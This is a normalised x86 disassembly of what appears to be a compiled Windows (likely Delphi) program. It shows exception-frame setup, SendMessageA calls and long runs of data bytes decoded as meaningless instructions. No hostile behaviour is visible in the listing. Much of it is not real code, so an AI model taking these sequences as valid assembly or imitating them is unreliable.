je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x3
test ebx ebx
je r-xdata
push 0x0
push 0x0
mov eax [ esi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0xc ]
mov [ edx ] eax
jmp r-xdata
push 0x0
push 0x0
mov eax [ edi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_406a59
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_406a81
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406a88
retn
sub_406a94
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_406ab9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406ac0
retn
sub_406acc
mov [ fs : esi ] 0xf0
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add cl dh
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add dl dh
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add bl dh
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add ah dh
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add ch dh
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add dh dh
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add bh dh
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add al bh
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add cl bh
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add dl bh
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add bl bh
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add ah bh
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add ch bh
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add dh bh
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add bh bh
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add al ah
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add cl ah
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add dl ah
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add bl ah
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add ah ah
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add ch ah
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add dh ah
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add bh ah
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add al ch
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add cl ch
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add dl ch
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add bl ch
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add ah ch
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add ch ch
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add dh ch
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add bh ch
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add al dl
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add cl dl
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add dl dl
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add bl dl
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add ah dl
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add ch dl
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add dh dl
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add bh dl
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add al bl
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add cl bl
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add dl bl
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add bl bl
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add ah bl
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add ch bl
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add dh bl
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add bh bl
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add al al
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add cl al
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add dl al
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add bl al
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add ah al
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add ch al
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add dh al
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add bh al
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add al cl
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add cl cl
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add dl cl
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add bl cl
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add ah cl
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add ch cl
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add dh cl
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add bh cl
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ eax + 0x640000ff ] dh
mov [ esi ] 0xb1
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ edx + 0x640000ff ] dh
mov [ esi ] 0xb3
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ edi + edi * 8 - 0x399c0000 ] dh
inc esi
add [ ebp + 0x640000ff ] dh
mov [ esi ] 0xb6
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ edi + 0x640000ff ] dh
mov [ esi ] 0xb8
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ ecx + 0x640000ff ] bh
mov [ esi ] 0xba
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ ebx + 0x640000ff ] bh
mov [ esi ] 0xbc
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ ebp + 0x640000ff ] bh
mov [ esi ] 0xbe
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ edi + 0x640000ff ] bh
mov [ esi ] 0xa0
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ ecx + 0x640000ff ] ah
mov [ esi ] 0xa2
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ ebx + 0x640000ff ] ah
mov [ esi ] 0xa4
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ ebp + 0x640000ff ] ah
mov [ esi ] 0xa6
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ edi + 0x640000ff ] ah
mov [ esi ] 0xa8
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ ecx + 0x640000ff ] ch
mov [ esi ] 0xaa
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_406dc9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406dd0
retn
sub_406de0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ esi + 0x40 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] bh
outsb
inc eax
add [ eax + eax ] cl
add [ eax ] al
mov al [ 0x70004010 ]
xor eax [ eax ]
jl r-xdata
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
outsb
inc eax
add [ eax ] dl
inc eax
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
outsb
inc eax
add [ eax ] dl
add [ eax ] al
add [ esi + ebp * 2 + 0x40 ] al
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
inc eax
add al al
xor [ eax ] al
nop
mov ah 0x40
add [ eax ] bl
xor [ eax ] eax
push cs
inc ebp
dec eax
popad
jo r-xdata
add [ eax ] al
add ah bl
insd
inc eax
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1000406e ] dl
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
push cs
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
or [ ebp + 0x78 ] eax
arpl [ ebp + 0x70 ] sp
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x6f ] cl
inc eax
add al al
xor [ eax ] al
nop
mov ah 0x40
add [ eax ] bl
xor [ eax ] eax
or al 0x45
dec edi
jne r-xdata
js r-xdata
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
outsb
nop
outsb
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1000406f ] ah
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
or eax [ ebp + 0x49 ]
outsb
dec edi
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec edi
dec bp
insd
dec eax
outsd
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
or [ ebp + 0x45 ] eax
js r-xdata
add [ eax ] al
inc ebp
jb r-xdata
add [ eax ] al
add ah bl
insd
inc eax
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
mov al [ 0x1000406f ]
lea eax [ eax ]
inc eax
add [ eax ] dl
add [ eax ] al
add ah bl
insd
inc eax
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
outsd
imul ebp [ edi + 0x6e ] 0x406eec90
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x70 ] bl
inc eax
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
adc al [ ebp + 0x45 ]
add [ eax ] al
add [ eax ] al
jb r-xdata
outsd
inc eax
add [ eax ] dl
add [ eax ] al
add [ edi + ebp * 2 + 0x40 ] dl
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
clc
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x10004070 ] dh
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
or [ ebp + 0x49 ] eax
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop eax
jo r-xdata
popad
insb
mov eax eax
clc
outsd
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
jb r-xdata
insd
outsd
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
jno r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
or al [ ebp + 0x44 ]
imul esi [ esi + 0x42 ] 0x72655a79
outsd
nop
or [ ecx + 0x40 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax + esi * 2 ] cl
inc eax
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
inc ebp
js r-xdata
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ edi + ebp * 2 + 0x40 ] dl
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ eax + esi * 2 ] cl
inc eax
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ ecx + 0x40 ] dh
outsd
jb r-xdata
add [ eax ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + esi * 2 + 0x100040 ] bh
add [ eax ] al
push esp
outsd
inc eax
inc eax
add al al
xor [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x71 ] ah
inc eax
add [ eax ] dl
add [ eax ] al
add [ eax + esi * 2 ] cl
inc eax
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
inc eax
js r-xdata
inc eax
add ah bl
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add [ edx ] dl
inc ebp
inc ebp
add [ eax ] al
add [ eax ] al
shl [ eax + 0x4070 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0x70
inc eax
add [ eax ] dl
imul ebp [ edi + 0x6e ] 0x40705890
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + esi * 2 ] dl
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
or al [ ebp + 0x4d ]
popad
je r-xdata
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add [ edx ] cl
inc ebp
dec ebp
jbe r-xdata
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esp 0x10004071
add [ eax ] al
add [ edi + ebp * 2 + 0x40 ] dl
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + esi * 2 + 0x40 ] ch
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
or al [ ebp + 0x49 ]
outsb
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
jb r-xdata
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jno r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
jb r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
or eax [ ebp + 0x5a ]
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x40726c90
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ eax + 0x71 ] dh
inc eax
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
outsd
jb r-xdata
inc eax
add [ eax ] dl
add [ eax ] al
add [ eax + 0x71 ] dh
inc eax
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0x72
insb
outsd
ja r-xdata
add ah bl
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add [ eax * 2 + 0x4f746e49 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ eax + 0x71 ] dh
inc eax
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
imul esi [ esi + 0x69 ] 0x72c46564
inc eax
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
or al 0x45
dec ecx
outsb
je r-xdata
adc al 0x72
inc eax
add [ eax ] al
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
or eax [ ebp + 0x52 ]
popad
outsb
inc ebp
jb r-xdata
inc eax
add [ ecx + esi * 2 + 0x40 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + esi * 2 + 0x40 ] dh
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
or al [ ebp + 0x55 ]
outsb
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + esi * 2 ] bl
inc eax
add [ eax ] dl
add [ eax ] al
add [ eax + 0x71 ] dh
inc eax
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
or [ ebp + 0x4f ] eax
add [ eax ] al
add [ eax ] al
inc eax
add al al
xor [ eax ] al
nop
mov ah 0x40
add [ eax ] bl
xor [ eax ] eax
cmovne ecx [ ecx + 0x6e ]
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
shl [ ebx + 0x40 ] 0x1
insb
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] cl
add [ eax ] al
fsubr [ ebp + 0x40 ]
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
jae r-xdata
insb
imul esp [ eax + edx * 2 + 0x6f ] 0x65746e69
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + esi * 2 ] ch
inc eax
add [ eax + eax ] cl
add [ eax ] al
fsubr [ ebp + 0x40 ]
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
or al 0x45
dec ecx
outsb
jbe r-xdata
jbe r-xdata
shl [ eax ] 0x40
add ah bl
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add [ ecx ] cl
inc ebp
dec edi
je r-xdata
xor eax [ eax ]
js r-xdata
add [ eax ] dl
add [ eax ] al
add [ esi + ebp * 2 + 0x40 ] al
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x10004074 ] cl
add [ eax ] al
add [ edi + ebp * 2 + 0x40 ] dl
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
or eax 0x6e6f4345
jbe r-xdata
lea eax [ eax ]
sub al 0x74
xor eax [ eax ]
jl r-xdata
jae r-xdata
jb r-xdata
inc eax
add [ eax ] al
add [ eax ] al
insb
imul esp [ ebx + eax * 2 + 0x61 ] 0x408d7473
add [ esp + esi * 2 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
jae r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add [ eax + 0x33 ] bh
rcr [ ebx + esi * 2 ] 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
je r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
adc [ ebp + 0x41 ] al
arpl [ ebx + 0x65 ] sp
jae r-xdata
outsb
lea eax [ eax ]
call sub_40b515
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
inc eax
add ah bl
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add [ eax * 2 + 0x61766e49 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebp * 2 + 0x40 ] dl
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esi
imul ebp [ edi + 0x6c ] 0x6f697461
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x75 ] al
inc eax
add [ eax ] dl
add [ eax ] al
add [ edi + ebp * 2 + 0x40 ] dl
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
inc eax
add al al
xor [ eax ] al
inc eax
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
ror [ eax + 0x4074 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ eax + eax * 2 ] dh
adc [ eax ] al
add [ eax ] al
push esp
outsd
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + esi * 2 + 0x100040 ] bl
add [ eax ] al
push esp
outsd
inc eax
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
push cs
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
call 0x1040b535
outsd
add [ eax ] al
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
jne r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
or [ ebp + 0x43 ] eax
mov eax eax
hlt
arpl [ ebx + 0x4f ] bp
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] dl
add [ eax ] al
add [ edi + ebp * 2 + 0x40 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
jne r-xdata
insb
nop
inc eax
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] cl
add [ eax ] al
fsubr [ ebp + 0x40 ]
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
outsd
insb
inc ebx
add [ eax ] al
add [ eax ] al
jb r-xdata
inc ebp
push ebx
je r-xdata
add ah bl
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc004076 ] dh
add [ eax ] al
add ah bl
insd
inc eax
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x76 ] dl
inc eax
add [ eax + eax ] cl
add [ eax ] al
fsubr [ ebp + 0x40 ]
add [ eax + 0x33 ] dh
inc eax
